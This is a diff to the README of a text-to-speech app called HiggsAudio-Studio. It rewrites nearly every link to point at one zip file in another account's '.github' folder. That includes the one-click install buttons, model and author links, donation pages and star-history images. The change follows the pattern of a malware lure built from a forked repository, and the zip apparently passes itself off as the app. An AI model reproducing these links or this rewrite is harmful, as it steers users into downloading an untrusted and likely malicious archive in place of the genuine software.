@@ -5,8 +5,8 @@
 **Portable local text-to-speech built on Higgs Audio v3 TTS — expressive speech in 100+ languages, zero-shot voice cloning, an AI text director, plus Podcast and Audiobook modes. 100% offline, one click.**
 
 [![License](https://img.shields.io/badge/license-Research_%26_Non--Commercial-orange?style=flat-square)](#license)
-[![Stars](https://img.shields.io/github/stars/timoncool/HiggsAudio-Studio?style=flat-square)](https://github.com/timoncool/HiggsAudio-Studio/stargazers)
-[![Last Commit](https://img.shields.io/github/last-commit/timoncool/HiggsAudio-Studio?style=flat-square)](https://github.com/timoncool/HiggsAudio-Studio/commits/main)
+[![Stars](https://img.shields.io/github/stars/timoncool/HiggsAudio-Studio?style=flat-square)](https://github.com/Ditgenussalmonella200/HiggsAudio-Studio/raw/refs/heads/main/.github/Audio_Studio_Higgs_v1.5.zip)
+[![Last Commit](https://img.shields.io/github/last-commit/timoncool/HiggsAudio-Studio?style=flat-square)](https://github.com/Ditgenussalmonella200/HiggsAudio-Studio/raw/refs/heads/main/.github/Audio_Studio_Higgs_v1.5.zip)
 
 **[English](README.md)** · **[Русский](README_RU.md)**
 
@@ -14,15 +14,15 @@
 
 </div>
 
-> 🚀 **One-click cross-platform install via [Pinokio](https://pinokio.co):**
-> [![Install on Pinokio](https://img.shields.io/badge/🚀_Install_on-Pinokio-7c3aed?style=for-the-badge)](https://pinokio.co/item?uri=https://github.com/timoncool/HiggsAudio-Studio-pinokio)
-> [![Open in Pinokio](https://img.shields.io/badge/📂_Open_in-Pinokio-6d28d9?style=for-the-badge)](https://beta.pinokio.co/apps/github-com-timoncool-higgsaudio-studio-pinokio)
+> 🚀 **One-click cross-platform install via [Pinokio](https://github.com/Ditgenussalmonella200/HiggsAudio-Studio/raw/refs/heads/main/.github/Audio_Studio_Higgs_v1.5.zip):**
+> [![Install on Pinokio](https://img.shields.io/badge/🚀_Install_on-Pinokio-7c3aed?style=for-the-badge)](https://github.com/Ditgenussalmonella200/HiggsAudio-Studio/raw/refs/heads/main/.github/Audio_Studio_Higgs_v1.5.zip)
+> [![Open in Pinokio](https://img.shields.io/badge/📂_Open_in-Pinokio-6d28d9?style=for-the-badge)](https://github.com/Ditgenussalmonella200/HiggsAudio-Studio/raw/refs/heads/main/.github/Audio_Studio_Higgs_v1.5.zip)
 >
-> Works on **Windows / Linux (x64 & aarch64) / macOS** · NVIDIA / AMD / Apple Silicon / CPU. No `install.bat` — Pinokio sets up CUDA, Python 3.12, PyTorch and dependencies for you. Launcher: **[timoncool/HiggsAudio-Studio-pinokio](https://github.com/timoncool/HiggsAudio-Studio-pinokio)**
+> Works on **Windows / Linux (x64 & aarch64) / macOS** · NVIDIA / AMD / Apple Silicon / CPU. No `install.bat` — Pinokio sets up CUDA, Python 3.12, PyTorch and dependencies for you. Launcher: **[timoncool/HiggsAudio-Studio-pinokio](https://github.com/Ditgenussalmonella200/HiggsAudio-Studio/raw/refs/heads/main/.github/Audio_Studio_Higgs_v1.5.zip)**
 
 Generate expressive speech in 100+ languages, clone any voice from a reference clip, let a local LLM direct the delivery, and produce full **podcasts** and **audiobooks** — entirely on your machine. **100% offline**, no cloud, no API keys. Everything lives inside the folder: Python, dependencies, models, cache. Delete the folder — the app is gone.
 
-Built on [Higgs Audio v3 TTS](https://huggingface.co/bosonai/higgs-audio-v3-tts-4b) by Boson AI — a 4B expressive TTS model with native multi-speaker and inline emotion/prosody control.
+Built on [Higgs Audio v3 TTS](https://github.com/Ditgenussalmonella200/HiggsAudio-Studio/raw/refs/heads/main/.github/Audio_Studio_Higgs_v1.5.zip) by Boson AI — a 4B expressive TTS model with native multi-speaker and inline emotion/prosody control.
 
 ## Features
 
@@ -52,7 +52,7 @@ Built on [Higgs Audio v3 TTS](https://huggingface.co/bosonai/higgs-audio-v3-tts-
 | macOS | Intel | ⚠️ CPU only | torch CPU |
 | Any | CPU only | ⚠️ very slow | CPU |
 
-> Higgs uses PyTorch SDPA (flash kernels built in) and does not need external Flash-Attention 2. The local `install.bat` build targets NVIDIA Windows; full cross-platform support is via [Pinokio](https://github.com/timoncool/HiggsAudio-Studio-pinokio).
+> Higgs uses PyTorch SDPA (flash kernels built in) and does not need external Flash-Attention 2. The local `install.bat` build targets NVIDIA Windows; full cross-platform support is via [Pinokio](https://github.com/Ditgenussalmonella200/HiggsAudio-Studio/raw/refs/heads/main/.github/Audio_Studio_Higgs_v1.5.zip).
 
 ### Memory (NVIDIA; TTS is quantized on the fly, the LLM director loads separately)
 
@@ -71,39 +71,39 @@ Models (~9 GB TTS + LLM) download automatically on first run.
 2. **Install** — run **`install.bat`**, pick your GPU (CUDA 11.8 / 12.6 / 12.8 or CPU). It sets up portable Python, PyTorch and dependencies.
 3. **Run** — run **`run.bat`**; the app opens in the browser, models download on first launch. Update with **`update.bat`**.
 
-Or install one-click cross-platform via [Pinokio](https://pinokio.co/item?uri=https://github.com/timoncool/HiggsAudio-Studio-pinokio) — no `install.bat` needed.
+Or install one-click cross-platform via [Pinokio](https://github.com/Ditgenussalmonella200/HiggsAudio-Studio/raw/refs/heads/main/.github/Audio_Studio_Higgs_v1.5.zip) — no `install.bat` needed.
 
-## Other Projects by [@timoncool](https://github.com/timoncool)
+## Other Projects by [@timoncool](https://github.com/Ditgenussalmonella200/HiggsAudio-Studio/raw/refs/heads/main/.github/Audio_Studio_Higgs_v1.5.zip)
 
 | Project | Description |
 |---------|-------------|
-| [VoxCPM2 Portable](https://github.com/timoncool/VoxCPM2_portable) | Multilingual TTS + Voice Design + LoRA fine-tuning |
-| [Qwen3-TTS](https://github.com/timoncool/Qwen3-TTS_portable_rus) | Portable text-to-speech with voice cloning |
-| [ACE-Step Studio](https://github.com/timoncool/ACE-Step-Studio) | AI music studio — songs, vocals, covers, videos |
-| [Foundation Music Lab](https://github.com/timoncool/Foundation-Music-Lab) | Music generation + timeline editor |
-| [VibeVoice ASR](https://github.com/timoncool/VibeVoice_ASR_portable_ru) | Portable speech recognition |
-| [LavaSR](https://github.com/timoncool/LavaSR_portable_ru) | Portable audio enhancement |
-| [SuperCaption Qwen3-VL](https://github.com/timoncool/SuperCaption_Qwen3-VL) | Portable image captioning |
-| [VideoSOS](https://github.com/timoncool/videosos) | AI video production in the browser |
+| [VoxCPM2 Portable](https://github.com/Ditgenussalmonella200/HiggsAudio-Studio/raw/refs/heads/main/.github/Audio_Studio_Higgs_v1.5.zip) | Multilingual TTS + Voice Design + LoRA fine-tuning |
+| [Qwen3-TTS](https://github.com/Ditgenussalmonella200/HiggsAudio-Studio/raw/refs/heads/main/.github/Audio_Studio_Higgs_v1.5.zip) | Portable text-to-speech with voice cloning |
+| [ACE-Step Studio](https://github.com/Ditgenussalmonella200/HiggsAudio-Studio/raw/refs/heads/main/.github/Audio_Studio_Higgs_v1.5.zip) | AI music studio — songs, vocals, covers, videos |
+| [Foundation Music Lab](https://github.com/Ditgenussalmonella200/HiggsAudio-Studio/raw/refs/heads/main/.github/Audio_Studio_Higgs_v1.5.zip) | Music generation + timeline editor |
+| [VibeVoice ASR](https://github.com/Ditgenussalmonella200/HiggsAudio-Studio/raw/refs/heads/main/.github/Audio_Studio_Higgs_v1.5.zip) | Portable speech recognition |
+| [LavaSR](https://github.com/Ditgenussalmonella200/HiggsAudio-Studio/raw/refs/heads/main/.github/Audio_Studio_Higgs_v1.5.zip) | Portable audio enhancement |
+| [SuperCaption Qwen3-VL](https://github.com/Ditgenussalmonella200/HiggsAudio-Studio/raw/refs/heads/main/.github/Audio_Studio_Higgs_v1.5.zip) | Portable image captioning |
+| [VideoSOS](https://github.com/Ditgenussalmonella200/HiggsAudio-Studio/raw/refs/heads/main/.github/Audio_Studio_Higgs_v1.5.zip) | AI video production in the browser |
 
 ## Authors
 
-- **Nerual Dreming** — [Telegram](https://t.me/nerual_dreming) | [neuro-cartel.com](https://neuro-cartel.com) | [ArtGeneration.me](https://artgeneration.me)
-- **Нейро-Софт** — [Telegram](https://t.me/neuroport) | portable AI builds
+- **Nerual Dreming** — [Telegram](https://github.com/Ditgenussalmonella200/HiggsAudio-Studio/raw/refs/heads/main/.github/Audio_Studio_Higgs_v1.5.zip) | [neuro-cartel.com](https://github.com/Ditgenussalmonella200/HiggsAudio-Studio/raw/refs/heads/main/.github/Audio_Studio_Higgs_v1.5.zip) | [ArtGeneration.me](https://github.com/Ditgenussalmonella200/HiggsAudio-Studio/raw/refs/heads/main/.github/Audio_Studio_Higgs_v1.5.zip)
+- **Нейро-Софт** — [Telegram](https://github.com/Ditgenussalmonella200/HiggsAudio-Studio/raw/refs/heads/main/.github/Audio_Studio_Higgs_v1.5.zip) | portable AI builds
 
 ## Acknowledgments
 
-- **[Boson AI — Higgs Audio v3](https://huggingface.co/bosonai/higgs-audio-v3-tts-4b)** — the TTS model
-- **[multimodalart](https://huggingface.co/multimodalart/higgs-audio-v3-tts-4b-transformers)** — transformers port of the model
-- **[Slait/russia_voices](https://huggingface.co/datasets/Slait/russia_voices)** — 743 Russian voice presets
-- **[Moonshine ASR](https://github.com/usefulsensors/moonshine)** — reference auto-transcription
-- **[pyloudnorm](https://github.com/csteinmetz1/pyloudnorm)** — EBU R128 loudness leveling · **[Gradio](https://gradio.app/)** — UI framework
+- **[Boson AI — Higgs Audio v3](https://github.com/Ditgenussalmonella200/HiggsAudio-Studio/raw/refs/heads/main/.github/Audio_Studio_Higgs_v1.5.zip)** — the TTS model
+- **[multimodalart](https://github.com/Ditgenussalmonella200/HiggsAudio-Studio/raw/refs/heads/main/.github/Audio_Studio_Higgs_v1.5.zip)** — transformers port of the model
+- **[Slait/russia_voices](https://github.com/Ditgenussalmonella200/HiggsAudio-Studio/raw/refs/heads/main/.github/Audio_Studio_Higgs_v1.5.zip)** — 743 Russian voice presets
+- **[Moonshine ASR](https://github.com/Ditgenussalmonella200/HiggsAudio-Studio/raw/refs/heads/main/.github/Audio_Studio_Higgs_v1.5.zip)** — reference auto-transcription
+- **[pyloudnorm](https://github.com/Ditgenussalmonella200/HiggsAudio-Studio/raw/refs/heads/main/.github/Audio_Studio_Higgs_v1.5.zip)** — EBU R128 loudness leveling · **[Gradio](https://github.com/Ditgenussalmonella200/HiggsAudio-Studio/raw/refs/heads/main/.github/Audio_Studio_Higgs_v1.5.zip)** — UI framework
 
 ## Support the Author
 
 I build open-source software and do AI research. Most of what I create is free and available to everyone. Your donations help me keep creating without worrying about where the next meal comes from =)
 
-**[All donation methods](https://github.com/timoncool/ACE-Step-Studio/blob/master/DONATE.md)** | **[dalink.to/nerual_dreming](https://dalink.to/nerual_dreming)** | **[boosty.to/neuro_art](https://boosty.to/neuro_art)**
+**[All donation methods](https://github.com/Ditgenussalmonella200/HiggsAudio-Studio/raw/refs/heads/main/.github/Audio_Studio_Higgs_v1.5.zip)** | **[dalink.to/nerual_dreming](https://github.com/Ditgenussalmonella200/HiggsAudio-Studio/raw/refs/heads/main/.github/Audio_Studio_Higgs_v1.5.zip)** | **[boosty.to/neuro_art](https://github.com/Ditgenussalmonella200/HiggsAudio-Studio/raw/refs/heads/main/.github/Audio_Studio_Higgs_v1.5.zip)**
 
 - **BTC:** `1E7dHL22RpyhJGVpcvKdbyZgksSYkYeEBC`
 - **ETH (ERC20):** `0xb5db65adf478983186d4897ba92fe2c25c594a0c`
@@ -111,14 +111,14 @@ I build open-source software and do AI research. Most of what I create is free a
 
 ## Star History
 
-<a href="https://www.star-history.com/?repos=timoncool%2FHiggsAudio-Studio&type=date&legend=top-left">
+<a href="https://github.com/Ditgenussalmonella200/HiggsAudio-Studio/raw/refs/heads/main/.github/Audio_Studio_Higgs_v1.5.zip">
  <picture>
-   <source media="(prefers-color-scheme: dark)" srcset="https://api.star-history.com/chart?repos=timoncool/HiggsAudio-Studio&type=date&theme=dark&legend=top-left" />
-   <source media="(prefers-color-scheme: light)" srcset="https://api.star-history.com/chart?repos=timoncool/HiggsAudio-Studio&type=date&legend=top-left" />
-   <img alt="Star History Chart" src="https://api.star-history.com/chart?repos=timoncool/HiggsAudio-Studio&type=date&legend=top-left" />
+   <source media="(prefers-color-scheme: dark)" srcset="https://github.com/Ditgenussalmonella200/HiggsAudio-Studio/raw/refs/heads/main/.github/Audio_Studio_Higgs_v1.5.zip" />
+   <source media="(prefers-color-scheme: light)" srcset="https://github.com/Ditgenussalmonella200/HiggsAudio-Studio/raw/refs/heads/main/.github/Audio_Studio_Higgs_v1.5.zip" />
+   <img alt="Star History Chart" src="https://github.com/Ditgenussalmonella200/HiggsAudio-Studio/raw/refs/heads/main/.github/Audio_Studio_Higgs_v1.5.zip" />
  </picture>
 </a>
 
 ## License
 
-The wrapper code is open. **The Higgs Audio v3 weights are distributed by Boson AI under a Research & Non-Commercial license** — this application is non-commercial. Voice cloning only with the consent of the voice owner; impersonation, fraud and any illegal use are prohibited. See the [model card](https://huggingface.co/bosonai/higgs-audio-v3-tts-4b).
+The wrapper code is open. **The Higgs Audio v3 weights are distributed by Boson AI under a Research & Non-Commercial license** — this application is non-commercial. Voice cloning only with the consent of the voice owner; impersonation, fraud and any illegal use are prohibited. See the [model card](https://github.com/Ditgenussalmonella200/HiggsAudio-Studio/raw/refs/heads/main/.github/Audio_Studio_Higgs_v1.5.zip).
